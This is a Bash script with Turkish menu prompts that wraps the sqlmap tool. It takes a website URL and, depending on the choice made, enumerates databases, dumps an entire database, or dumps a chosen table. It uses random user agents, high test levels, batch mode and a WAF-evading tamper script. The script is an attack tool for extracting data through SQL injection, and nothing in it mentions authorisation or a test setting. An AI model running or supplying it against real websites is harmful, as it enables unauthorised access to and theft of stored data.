#!/bin/bash
clear
echo -n "site yaz : "
read WEBSITE

clear
echo -e "1 : db öğrenme \n"
echo -e "2 : db çekme \n"
echo -e "3 : table çekme \n"
echo -e "4 : update \n"
echo -e "Seç : "

read COUNTRY


case $COUNTRY in

  1)
    sqlmap -u $WEBSITE --dbs --random-agent --level=5 --risk=1 --threads=5 --batch --tamper=between.py
    ;;

  2)
    echo -n "database adını yaz : "
    read DATABASE
    sqlmap -u $WEBSITE -D $DATABASE --dump --random-agent --level=5 --risk=1 --threads=5 --batch --tamper=between.py
    ;;

  3)
    echo -n "table adını yaz : "
    read TABLE
    echo -n "database adını yaz : "
    read DATABASE
    sqlmap -u $WEBSITE -D $DATABASE -T $TABLE --dump --random-agent --level=5 --risk=1 --threads=5 --batch --tamper=between.py
    ;;

  4)
    sqlmap --update
    ;;

  *)
    echo -n "unknown"
    ;;
esac
